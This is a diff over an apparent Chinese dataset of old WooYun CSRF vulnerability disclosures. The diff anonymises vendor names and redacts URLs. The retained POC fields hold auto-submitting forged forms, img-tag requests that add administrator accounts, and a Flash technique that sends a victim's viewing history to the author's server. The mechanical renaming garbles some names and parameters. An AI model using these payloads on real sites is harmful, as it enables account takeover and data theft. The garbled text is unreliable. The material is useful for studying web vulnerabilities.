+**详情**: 1. 乌云zone上传头像地方没有检验,可以上传swf文件.你们可以看我帅气的头像https://example.com/[已脱敏] 发表帖子时,可以加载任意的swf,此时swf容器的allownetworking值为internal.你们可以看我帅气的回复https://example.com/[已脱敏] 你们都知道了.接下来就是写一个可以读取zone的token并且向指定的帖子发起感谢如果贪心的话可以while(1){do}的swf,然后传到zone自己的头像,然后发一个帖子,题目就叫<叫你不要点点一次一wb>
 
 **POC**: 我什么也没干
 
@@ -3985,8 +3985,8 @@
 ---
 
 ---
-### [wooyun-2013-017155] 腾讯大讲堂投票CSRF
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-017155] 某互联网公司大讲堂投票CSRF
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
 
@@ -3997,7 +3997,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 腾讯大讲堂创月版，登录后进行投票，未做csrf的检查，虽然使用post，但同样支持get。同时，对referer未做足够的检测。
+**详情**: 某互联网公司大讲堂创月版，登录后进行投票，未做csrf的检查，虽然使用post，但同样支持get。同时，对referer未做足够的检测。
 
 **POC**: 1：通过个人中心，借助群聊下手2：大讲堂好友比较少，效果很鸡肋漏洞比较鸡肋...
 
@@ -4008,7 +4008,7 @@
 
 ---
 ### [wooyun-2012-014234] 企鵝CSRF，可以窃取用户邮件
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: CSRF
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -4019,9 +4019,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: qq邮箱CSRF，基本可以为所欲为了。什么? 用POST? 什么? 有SID? 什么？有referer？ 看上去防范很全面，但其实不堪一击。demo是转发用户的邮件到指定邮箱，毫无疑问的20RANK级高危漏洞了。证明中说过程吧。
+**详情**: 某互联网公司邮箱CSRF，基本可以为所欲为了。什么? 用POST? 什么? 有SID? 什么？有referer？ 看上去防范很全面，但其实不堪一击。demo是转发用户的邮件到指定邮箱，毫无疑问的20RANK级高危漏洞了。证明中说过程吧。
 
-**POC**: 1.发封邮件给需要攻击的用户，带上个宝贝swf2. 可爱的预览功能哦，居然和邮箱同域，flash大展神威啊在，而且绕过referer检测。3.看看我这个flash到底是什么4.看了这flash的后果5.关键一点，如何得到SID亲爱的qq,为了方便我，在URL中就有SID!在第4步中，可以看到代码中我写死了sid。那只是因为我懒得写代码了。 似乎播放器做过手脚，我无法通过常规方法得到url,但很简单，我只需要向我控制的服务器发起一个请求，然后服务端检测referer，然后返回sid和其它参数给flash就可以了。
+**POC**: 1.发封邮件给需要攻击的用户，带上个宝贝swf2. 可爱的预览功能哦，居然和邮箱同域，flash大展神威啊在，而且绕过referer检测。3.看看我这个flash到底是什么4.看了这flash的后果5.关键一点，如何得到SID亲爱的某互联网公司,为了方便我，在URL中就有SID!在第4步中，可以看到代码中我写死了sid。那只是因为我懒得写代码了。 似乎播放器做过手脚，我无法通过常规方法得到url,但很简单，我只需要向我控制的服务器发起一个请求，然后服务端检测referer，然后返回sid和其它参数给flash就可以了。
 
 **绕过**: 直接利用
 
@@ -4041,7 +4041,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://nc.youku.com/index_nc?r[]=cookielist&e[]=mini_panel&s=mini&cb=any反正全部写那里了，html都拖拖的。给泡妹纸提供的参考信息？
+**详情**: https://example.com/[已脱敏]]=cookielist&e[]=mini_panel&s=mini&cb=any反正全部写那里了，html都拖拖的。给泡妹纸提供的参考信息？
 
 **POC**: 妥妥的
 
@@ -4073,8 +4073,8 @@
 ---
 
 ---
-### [wooyun-2013-019564] 最新新浪微博刷粉漏洞..
-**厂商**: 新浪 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-019564] 最新某社交平台某社交平台刷粉漏洞..
+**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -4087,7 +4087,7 @@
 
 **详情**: 没什么技术难度，在页面里面插入一个图片代码就行了，超级简单。至于qing博客不能插入自定义的地址的图片，只要万能的firebug出马就行了。我是没有啥影响力啊，要是有影响力，这半天刷个万千的粉丝，也是可以的。哈哈哈。感谢各位wooyun兄弟测试...至于那个qing文章的标题，和企鹅没啥关系啊。就是耸人听闻罢了，骗大家点击进来，好执行那个加粉的img 而已~ 哈哈哈~
 
-**POC**: http://qing.weibo.com/1279940810/4c4a58ca330031tm.htmlhttp://tw.weibo.com/api/addfriendship/?uid=1279940810
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4095,8 +4095,8 @@
 ---
 
 ---
-### [wooyun-2012-09438] 新浪微博某站CSRF漏洞
-**厂商**: 新浪 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-09438] 某社交平台某社交平台某站CSRF漏洞
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
 
@@ -4107,9 +4107,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 比较鸡肋，用户必须先登录weibo.cn，针对手机版用户和平板用户。在接受GET的信息的时候，未对GET来路(Referer)进行验证，同时也没有在GET的信息中加token验证信息的正确性，导致漏洞产生。新浪微博PAD版似乎全站都没做CSRF防护，后果你猜~
+**详情**: 比较鸡肋，用户必须先登录weibo.cn，针对手机版用户和平板用户。在接受GET的信息的时候，未对GET来路(Referer)进行验证，同时也没有在GET的信息中加token验证信息的正确性，导致漏洞产生。某社交平台某社交平台PAD版似乎全站都没做CSRF防护，后果你猜~
 
-**POC**: 发微博http://pad.weibo.cn/ipad/statuses/create_mblog?status=XXXXXXXXXXX加关注http://pad.weibo.cn/ipad/friendships/create_friendship?uid=1661493522原本的请求中还有一个gsid，不过似乎要求不太严格，gsid可有可无。
+**POC**: 发某社交平台https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4117,8 +4117,8 @@
 ---
 
 ---
-### [wooyun-2012-013847] 网易csrf，百密必有一疏啊
-**厂商**: 网易 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-013847] 某互联网公司csrf，百密必有一疏啊
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -4129,7 +4129,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这个漏洞算损人不利已了，强行并静默地关闭用户的手机邮箱。对用户而言可能是小事，对网易可能算大事了吧，用户资料任人蹂躏啊。网易passport关闭手机邮箱，使用直接的GET链接，没有使用sid认证，所以，你懂的，来个<img src>到任何用户需要认证后使用的地方，比如邮箱等，发封邮件带上这个img src给需要攻击的用户，用户只要一打开邮件，不需要做任何操作，手机邮箱就挂了。。。
+**详情**: 这个漏洞算损人不利已了，强行并静默地关闭用户的手机邮箱。对用户而言可能是小事，对某互联网公司可能算大事了吧，用户资料任人蹂躏啊。某互联网公司passport关闭手机邮箱，使用直接的GET链接，没有使用sid认证，所以，你懂的，来个<img src>到任何用户需要认证后使用的地方，比如邮箱等，发封邮件带上这个img src给需要攻击的用户，用户只要一打开邮件，不需要做任何操作，手机邮箱就挂了。。。
 
 **POC**: 原来的信息邮件来了，看到那叉叉了伐，中标了啊不信？进passport看一下。
 
@@ -4151,9 +4151,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 站点：http://f.dangdang.com/问题出现在加关注这里http://f.dangdang.com/person/6898509240848/summerrrr123这个用户还没有关注这个用户
+**详情**: 站点：https://example.com/[已脱敏]
 
-**POC**: POST /callback/add_friends.php?1418964916807 HTTP/1.1Host: f.dangdang.comProxy-Connection: keep-aliveContent-Length: 36Accept: */*Origin: http://f.dangdang.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 S
+**POC**: POST /callback/add_friends.php?1418964916807 HTTP/1.1Host: f.dangdang.comProxy-Connection: keep-aliveContent-Length: 36Accept: */*Origin: https://example.com/[已脱敏] XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 S
 
 **绕过**: 直接利用
 
@@ -4173,7 +4173,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 访问：http://quan.sohu.com/pinglun/cyqemw6s1/362812738发布的评论可CSRF登陆后访问http://1.wctest.sinaapp.com/souhu/caipiaochangyan.html即可
+**详情**: 访问：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -4195,9 +4195,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: phpcms后台虽然做了全局的token，但是他的token确是保存在url中，所以可以构造先跳转后台主页获取pc_hash。我们可以用到这个dedecms的办法http://wooyun.org/bugs/wooyun-2014-076556代码和思路这里都有。参照这个就可以了OK到后台看看写进去了剩下有了token什么都好说，phpcms还是不检测refer的。然后再继续构造表单提交，添加用户。成功
+**详情**: phpcms后台虽然做了全局的token，但是他的token确是保存在url中，所以可以构造先跳转后台主页获取pc_hash。我们可以用到这个dedecms的办法https://example.com/[已脱敏]
 
-**POC**: phpcms后台虽然做了全局的token，但是他的token确是保存在url中，所以可以构造先跳转后台主页获取pc_hash。我们可以用到这个dedecms的办法http://wooyun.org/bugs/wooyun-2014-076556代码和思路这里都有。参照这个就可以了OK到后台看看写进去了剩下有了token什么都好说，phpcms还是不检测refer的。然后再继续构造表单提交，添加用户。成功
+**POC**: phpcms后台虽然做了全局的token，但是他的token确是保存在url中，所以可以构造先跳转后台主页获取pc_hash。我们可以用到这个dedecms的办法https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4219,7 +4219,7 @@
 
 **详情**: 得图网全站设计缺陷导致跨站请求伪造(CSRF)(可全站点刷粉丝等)。
 
-**POC**: <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>CSRF   POC</title></head><body><form action="http://www.detu.com/ajax/collect/coluser" method="post"><input type="hidden" name="domain" value="********"/></form><script>document.forms[0].submit();</script></body></
+**POC**: <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>CSRF   POC</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="domain" value="********"/></form><script>document.forms[0].submit();</script></body></
 
 **绕过**: 直接利用
 
@@ -4241,7 +4241,7 @@
 
 **详情**: 红袖添香某处没验证，导致CSRF漏洞，攻击者可以利用此漏洞刷钱
 
-**POC**: 1、我们打开任意一个作品，然后找到那个右下角有一个送荷包得月票（这个是作者跟晋江分成的）2、 我们用Burp 截断一下看看，发现没有任何验证~~，我们接下来构造一个表单3、构造表单如下<html><body><form id="post123" name="post123" action="http://novel.hongxiu.com/aspxnovel/framev3/upredpack.aspx" method="POST"><input type="hidden" name="txtExpense" value="1" /><input type="hidden" name="txt
+**POC**: 1、我们打开任意一个作品，然后找到那个右下角有一个送荷包得月票（这个是作者跟晋江分成的）2、 我们用Burp 截断一下看看，发现没有任何验证~~，我们接下来构造一个表单3、构造表单如下<html><body><form id="post123" name="post123" action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="txtExpense" value="1" /><input type="hidden" name="txt
 
 **绕过**: 直接利用
 
@@ -4271,8 +4271,8 @@
 ---
 
 ---
-### [wooyun-2015-0105354] 网易同城约会两处csrf，稍有鸡肋
-**厂商**: 网易 | **年份**: 2015 | **类型**: CSRF
+### [wooyun-2015-0105354] 某互联网公司同城约会两处csrf，稍有鸡肋
+**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -4283,7 +4283,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://yuehui.163.com/存在两处csrf导致可以刷粉等问题，一处是在关注处，另一处是在好感处
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 问题出现在了关注和好感处用连个测试账号测试了下，随便找个人关注下，拦截包，然后得到关注某人的具体链接把地址发给我的另外一个账号关注成功好感拿那出一样，不过要选择异性才能好感成功。这下就能伪装成高富帅，最好设置一个帅的图像，疯狂给美女们发消息，说不定还能约个炮呢！使劲约吧
 
@@ -4305,7 +4305,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 豌豆荚非常贴心的提供了云推送功能只要用户在手机客户端登录并允许云推送，那么网页上轻轻一点，应用就自动开始在手机上下载，但是云推送这么重要的功能却并没有做CSRF防护，给豌豆荚用户带来了风险。我们点击云推送按钮，同时抓包，发现是个POST请求，但是呆萌的程序员POST和GET不分，导致可以直接用GET发起请求，比如推送“搜狗拼音输入法”的请求如下：http://www.wandoujia.com/offlinepush/push?did=aea63ec6e44f4855b51e06e7ad290648f53c944a&title=%E6%90%9C%E7%8B%97%E6%89%8B%E6%9C%BA%E8%BE%93%E5%85%A5%E6%B3%95&url=http://apps.wandoujia.com/apps/com.sohu.inputmethod.sogou/downloa
+**详情**: 豌豆荚非常贴心的提供了云推送功能只要用户在手机客户端登录并允许云推送，那么网页上轻轻一点，应用就自动开始在手机上下载，但是云推送这么重要的功能却并没有做CSRF防护，给豌豆荚用户带来了风险。我们点击云推送按钮，同时抓包，发现是个POST请求，但是呆萌的程序员POST和GET不分，导致可以直接用GET发起请求，比如推送“搜狗拼音输入法”的请求如下：https://example.com/[已脱敏]
 
 **POC**: 访问后浏览器显示：说明请求成功了，我使用多个账号进行尝试，均显示成功漏洞危害：1.在用户不知情的情况下推送并可以后台静默安装任意应用2.由于这个请求可以无限次发起，如果一个用户多次在不知情的情况下发起这个请求（比如在豌豆荚论坛的多个帖子内植入这个请求）可以进行骚扰（我自己就被十几个搜狗的下载提示搞的晕头转向）Ps.给每个豌豆荚用户装个大姨吗可好？
 
@@ -4327,7 +4327,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 你们发送消息方面的CSRF防御做得挺好的。收藏帖子这个功能却是GET请求而且没有控制来源，危害严重！基本上看一眼就收藏。瞬间刷爆抓到了两个关键的GET型CSRF，构造如下：http://my.xcar.com.cn/favorite/index.php?action=addthread&id=19454122&title=helloaika&noting=a.jpghttp://www.xcar.com.cn/bbs/my.php?item=favorites&tid=19454122&inajax=1&noting=a.jpg然后来到发帖页面，构造如下：
+**详情**: 你们发送消息方面的CSRF防御做得挺好的。收藏帖子这个功能却是GET请求而且没有控制来源，危害严重！基本上看一眼就收藏。瞬间刷爆抓到了两个关键的GET型CSRF，构造如下：https://example.com/[已脱敏]
 
 **POC**: 刚发帖没多久人气瞬间 104 ，过会又涨了
 
@@ -4349,9 +4349,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题URL: http://i.sohu.com/a/app/mblog/save.htm?_input_encode=UTF-8 可CSRF发微博。下面来看看怎么利用
+**详情**: 问题URL: https://example.com/[已脱敏] 可CSRF发某社交平台。下面来看看怎么利用
 
-**POC**: 通过上面的URL我构造了一个payload ，打开后先POST一条微博，然后等5秒跳转到指定地址。<meta http-equiv="content-type" content="text/html;charset=utf-8"><h1>正在跳转...</h1><iframe id="test_iframe" src="http://www.tianya.cn/82776194" style='display:none'></iframe><script>function CSRF(){test_iframe.document.write("<form id='test_form' actio
+**POC**: 通过上面的URL我构造了一个payload ，打开后先POST一条某社交平台，然后等5秒跳转到指定地址。<meta http-equiv="content-type" content="text/html;charset=utf-8"><h1>正在跳转...</h1><iframe id="test_iframe" src="https://example.com/[已脱敏]" style='display:none'></iframe><script>function CSRF(){test_iframe.document.write("<form id='test_form' actio
 
 **绕过**: 直接利用
 
@@ -4371,7 +4371,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题出在 个人资料处由于是GET请求直接构造下面链接，http://member.360hitao.com/member/ashx/myinfo.ashx?methods=Save&coun=CN&name=%u9A6C%u4E91&fN=Ma&lN=Yun&carid=&sex=0&pcode=CNBJ&ccode=null&mobi=13313362313&addr1=%u8FD9%u91CC%u662F%u4E4C%u4E91&add2=undefined&zipcode=111111&tel=&web=undefined&qq=&msn=undefined&remark=&ruEmail=wooyun11111@163.com&_=1440076644567
+**详情**: 问题出在 个人资料处由于是GET请求直接构造下面链接，https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -4381,8 +4381,8 @@
 ---
 
 ---
-### [wooyun-2013-035719] 百度某分站继续刷粉丝二
-**厂商**: 百度 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-035719] 某搜索引擎某分站继续刷粉丝二
+**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -4393,7 +4393,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、关注该妹子http://jingyan.baidu.com/user/npublic?un=orangefishll2、抓包3、post提交无法成功，应该是做了referer限制，所以想到在http://jingyan.baidu.com/域名下分享一篇文章，但是需要get请求才行，测试了一下可以。发表一篇经验：http://jingyan.baidu.com/article/preview?eidEnc=0964eca22049fa8285f536cc在参考资料处插入链接：4、点击后返回数据
+**详情**: 1、关注该妹子https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -4415,9 +4415,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1#子站http://meishi.suning.com问题多多。首先支持将本地商户信息发送到用户自定义的手机，未对手机及内容进行强制认证，导致了用户可以自定义【推送号码】以及【推送的内容】，看图然后拦截数据包，修改关键字段POST /lifesquare/homePage/ajax/sendMessage.htm HTTP/1.1phoneNumId=可自定义&sendInfo=%E7%BB%B4%E5%88%A9%E5%BA%B7(%E8%8B%9C%E8%93%BF%E5%9B%AD%E5%BA%97)%3A%E7%99%BD%E4%B8%8B%E5%8C%BA%E7%9F%B3%E9%97%A8%E5%9D%8E165%E5%8F%B7%E7%94%B5%E8%AF%9D%EF%BC%9A025-58854808+http%3A%2F%2Fmeishi.suning.com%2Fl
+**详情**: 1#子站https://example.com/[已脱敏] /lifesquare/homePage/ajax/sendMessage.htm HTTP/1.1phoneNumId=可自定义&sendInfo=%E7%BB%B4%E5%88%A9%E5%BA%B7(%E8%8B%9C%E8%93%BF%E5%9B%AD%E5%BA%97)%3A%E7%99%BD%E4%B8%8B%E5%8C%BA%E7%9F%B3%E9%97%A8%E5%9D%8E165%E5%8F%B7%E7%94%B5%E8%AF%9D%EF%BC%9A025-58854808+http%3A%2F%2Fmeishi.suning.com%2Fl
 
-**POC**: 2#订单遍历http://meishi.suning.com/lifesquare/order/userOrderDetail.htm?orderId=xx再来3#生活广场加关注csrfhttp://meishi.suning.com/lifesquare/homePage/ajax/addAttention.htm?branchId=100XXXXget请求，鉴权不严格4#小跨站
+**POC**: 2#订单遍历https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4437,9 +4437,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 115优盘 http://u.115.com/ 大量使用 AJAX 来触发用户操作, 但 AJAX 请求不但没有使用 CSRF token, 而且使用了 GET 来触发, 导致可以轻易构造出 URL 来触发操作
+**详情**: 115优盘 https://example.com/[已脱敏] 大量使用 AJAX 来触发用户操作, 但 AJAX 请求不但没有使用 CSRF token, 而且使用了 GET 来触发, 导致可以轻易构造出 URL 来触发操作
 
-**POC**: 在任何论坛发布一个链接到 http://is.gd/jW4CF.jpg 的图片即可, 如果用户访问这个页面前曾经登录过 115网盘, 则会在用户的目录下创建一个叫fb5672 的目录
+**POC**: 在任何论坛发布一个链接到 https://example.com/[已脱敏] 的图片即可, 如果用户访问这个页面前曾经登录过 115网盘, 则会在用户的目录下创建一个叫fb5672 的目录
 
 **绕过**: 直接利用
 
@@ -4447,8 +4447,8 @@
 ---
 
 ---
-### [wooyun-2013-043900] 腾讯微生活CSRF
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-043900] 某互联网公司微生活CSRF
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -4461,7 +4461,7 @@
 
 **详情**: 
 
-**POC**: 访问：http://bbs.meishi.qq.com/forum.php?mod=viewthread&tid=852906&extra=点下链接即可
+**POC**: 访问：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4481,9 +4481,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 由于metinfo在核心部分，存在变量覆盖漏洞 （不懂是不是）所以GET = POST , POST = GET于是可以使用GET请求来添加管理员，且添加管理员页面没有任何TOKEN防护我首先尝试增加个管理员，然后用BurpSuite抓包，再把POST请求拷贝下来，放入GET请求中。构造个CSRF URLlocalhost/metinfo/admin/admin/save.php?action=add&useid=hacked&pass1=hacked&pass2=hacked&name=Hacked&sex=0&tel=&mobile=01234567890&email=hacked%40hacked.com&qq=&msn=&taobao=&admin_introduction=&admin_group=3&langok_cn=cn&admin_op0=metinfo&admin_op
+**详情**: 由于metinfo在核心部分，存在变量覆盖漏洞 （不懂是不是）所以GET = POST , POST = GET于是可以使用GET请求来添加管理员，且添加管理员页面没有任何TOKEN防护我首先尝试增加个管理员，然后用BurpSuite抓包，再把POST请求拷贝下来，放入GET请求中。构造个CSRF URLlocalhost/metinfo/admin/admin/save.php?action=add&useid=hacked&pass1=hacked&pass2=hacked&name=Hacked&sex=0&tel=&mobile=01234567890&email=hacked%40hacked.com&某互联网公司=&msn=&taobao=&admin_introduction=&admin_group=3&langok_cn=cn&admin_op0=metinfo&admin_op
 
-**POC**: 把上面的请求放到了 <img> 中html的源码是<img src="http://localhost/metinfo/admin/admin/save.php?action=add&useid=hacked&pass1=hacked&pass2=hacked&name=Hacked&sex=0&tel=&mobile=01234567890&email=hacked%40hacked.com&qq=&msn=&taobao=&admin_introduction=&admin_group=3&langok_cn=cn&admin_op0=metinfo&admin_op1=add&admin
+**POC**: 把上面的请求放到了 <img> 中html的源码是<img src="http://localhost/metinfo/admin/admin/save.php?action=add&useid=hacked&pass1=hacked&pass2=hacked&name=Hacked&sex=0&tel=&mobile=01234567890&email=hacked%40hacked.com&某互联网公司=&msn=&taobao=&admin_introduction=&admin_group=3&langok_cn=cn&admin_op0=metinfo&admin_op1=add&admin
 
 **绕过**: 直接利用
 
@@ -4492,7 +4492,7 @@
 
 ---
 ### [wooyun-2012-07600] Xweibo插件一处csrf
-**厂商**: 新浪 | **年份**: 2012 | **类型**: CSRF
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -4503,9 +4503,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: Xweibo插件一处csrf可以偷偷取消别人的新郎微博绑定
+**详情**: Xweibo插件一处csrf可以偷偷取消别人的新郎某社交平台绑定
 
-**POC**: src=http://bbs.x.weibo.com/xwb.php?m=xwbSiteInterface.unbind
+**POC**: src=https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4531,7 +4531,7 @@
 
 **绕过**: 直接利用
 
-**修复**: 你为何忽略我两个洞？你为何就不肯发一个礼物给我？ 你为何http://wap.dazhong.com/还有缺陷？ 你为何要这么厉害
+**修复**: 你为何忽略我两个洞？你为何就不肯发一个礼物给我？ 你为何https://example.com/[已脱敏] 你为何要这么厉害
 ---
 
 ---
@@ -4571,7 +4571,7 @@
 
 **详情**: 21号提交的漏洞，当天就确认漏洞了，做出了反应。这几天，再上爱拍的时候发现，粉丝还在增长，就去看看什么原因。在去利用这个地址在没有来源的情况下提交，信息框提示“无效的请求方式”，很明显是修复过。之前我在BBS中回帖用img标签引用过这个地址，会不会是这个问题呢，于是，我就再一次用img标签引用这个地址，去回帖。过了一下，有粉丝了，我看了看粉丝的名字，对比了其他回帖人的名字，果然中招了。所以，可以得出他们是这样修复的：设置了接口只允许来自*.aipai.com的请求这样的修复显然是有问题的，没有考虑到来自论坛的调用，论坛的地址是bbs.aipai.com，所以就通过了接口的来源检查。在论坛中进行CSRF效果更好，因为用户都是登陆状态，危害更大。
 
-**POC**: 在BBS回帖中、个人签名中插入以下代码。[img]http://www.aipai.com/app/www/apps/subscribe.php?bid=[被关注的ID]&callback%09=scribeSuccess_new&action=addSubscribe[/img]
+**POC**: 在BBS回帖中、个人签名中插入以下代码。[img]https://example.com/[已脱敏]]&callback%09=scribeSuccess_new&action=addSubscribe[/img]
 
 **绕过**: 直接利用
 
@@ -4593,7 +4593,7 @@
 
 **详情**: 
 
-**POC**: http://t2.fanwe.net:82/index.php?ctl=uc_account在账户设置这里抓包了一下，发现没有任何的验证。现在我们构造一个表单，代码如下：<html><body><form action="http://t2.fanwe.net:82/index.php?ctl=uc_account&act=save" method="POST"><input type="hidden" name="email" value="296864045@qq.com" /><input type="hidden" name="user_name" value="hackimg" /
+**POC**: https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="email" value="296864045@某互联网公司.com" /><input type="hidden" name="user_name" value="hackimg" /
 
 **绕过**: 直接利用
 
@@ -4615,7 +4615,7 @@
 
 **详情**: phpokcms存在csrf漏洞，管理员查看会员列表时不知不觉会自动添加新的系统管理员。位置在会员头像处的img标签，由于新闻评论可显示头像，也可蠕虫发评论。下面仅证明添加管理员的部分。具体代码分析了，直接poc。
 
-**POC**: 注册会员后打开如下链接。（域名路径请视情况修改）http://127.0.0.1/phpok/api.php?c=usercp&f=avatar&data=%2fphpok%2fadmin.php%3Fc%3Dadmin%26f%3Dsave%26id%3D%26account%3Dadmin2%26pass%3Dadmin2%26email%3Dadmin%2540a1.com%26status%3D1%26if_system%3D1然后登录管理员后台，点击会员（此时一个名为admin2 密码为admin2的系统管理员已经添加成功。）再打开设置，管理员维护去看一下即可。
+**POC**: 注册会员后打开如下链接。（域名路径请视情况修改）http://[IP已脱敏] 密码为admin2的系统管理员已经添加成功。）再打开设置，管理员维护去看一下即可。
 
 **绕过**: 直接利用
 
@@ -4657,9 +4657,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.multigold.com.cn/问题在收货地址，可删除  可添加添加收货地址http://member.multigold.com.cn/account/memberInfo_saveMemberAddress?newtime=1437460773098&isDefault=N&address1=%E5%95%8A%E5%A4%A7%E7%A5%9E%E5%A4%A7%E5%A4%9A%E6%98%AF&fullAddress=%E5%A4%A9%E6%B4%A5%E5%A4%A9%E6%B4%A5%E5%B8%82%E6%9C%9D%E9%98%B3%E5%8C%BA%E4%BA%94%E7%8E%AF%E9%87%8C%E5%B7%A6%E5%AE%B6%E5%BA%84%E3%80%81%E6%96%B0%E6%BA%90%E9%87%8C%E5%95%8A%
+**详情**: https://example.com/[已脱敏]  可添加添加收货地址https://example.com/[已脱敏]
 
-**POC**: 删除收货地址   id随便改POC<html><body><form action="http://member.multigold.com.cn/account/memberInfo_updateMemberAddress?newtime=1437462010956" method="POST"><input type="hidden" name="memberAddressId" value="3800" /><input type="hidden" name="isDefault" value="" /><input type="hidden" name="address1" value
+**POC**: 删除收货地址   id随便改POC<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="memberAddressId" value="3800" /><input type="hidden" name="isDefault" value="" /><input type="hidden" name="address1" value
 
 **绕过**: 直接利用
 
@@ -4689,7 +4689,7 @@
 ---
 
 ---
-### [wooyun-2013-017947] 搜房网微博蠕虫
+### [wooyun-2013-017947] 搜房网某社交平台蠕虫
 **厂商**: 搜房网 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 后台管理
@@ -4745,9 +4745,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 历史记录api是：http://api.bilibili.com/x/history其crossdomain.xml如下配置<cross-domain-policy><allow-access-from domain="*" secure="false"/></cross-domain-policy>使用flash即可直接Get到json然后post到自己服务器上就行了
+**详情**: 历史记录api是：https://example.com/[已脱敏] domain="*" secure="false"/></cross-domain-policy>使用flash即可直接Get到json然后post到自己服务器上就行了
 
-**POC**: 我用ajaxf制作了一个页面，受害者只要访问这个页面，历史记录和用户mid就会被上传到预置的服务器当中。受害者需要保留有bilibili的cookie，即在线。攻击演示<video href="http://player.letvcdn.com/lc01_p/201509/10/14/17/14/newplayer/bcloud.swf?uu=7f3cbb64e4&vu=e517691d23&auto_play=0&gpcflag=1#.swf"/>没钱买乐视云会员，糊着将就下吧。。注意前10秒标注的用户名cting00与后面ftp服务器上出现的txt里的用户名一样，观看记录也一样。
+**POC**: 我用ajaxf制作了一个页面，受害者只要访问这个页面，历史记录和用户mid就会被上传到预置的服务器当中。受害者需要保留有bilibili的cookie，即在线。攻击演示<video href="https://example.com/[已脱敏]"/>没钱买乐视云会员，糊着将就下吧。。注意前10秒标注的用户名cting00与后面ftp服务器上出现的txt里的用户名一样，观看记录也一样。
 
 **绕过**: 直接利用
 
@@ -4755,8 +4755,8 @@
 ---
 
 ---
-### [wooyun-2010-0641] 网易微博CSRF利用2：自动添加关注，并自动发微博
-**厂商**: 网易 | **年份**: 2010 | **类型**: CSRF
+### [wooyun-2010-0641] 某互联网公司某社交平台CSRF利用2：自动添加关注，并自动发某社交平台
+**厂商**: 某互联网公司 | **年份**: 2010 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
 
@@ -4769,7 +4769,7 @@
 
 **详情**: 登录后访问构造出的表单，就能添加“小锅盖头”为关注。
 
-**POC**: <form method="POST" name="CSRF" action="http://t.163.com:80/friendships/create/3198225089.json"><input type="hidden" name="name" value="value"/></form><script>document.CSRF.submit();</script>
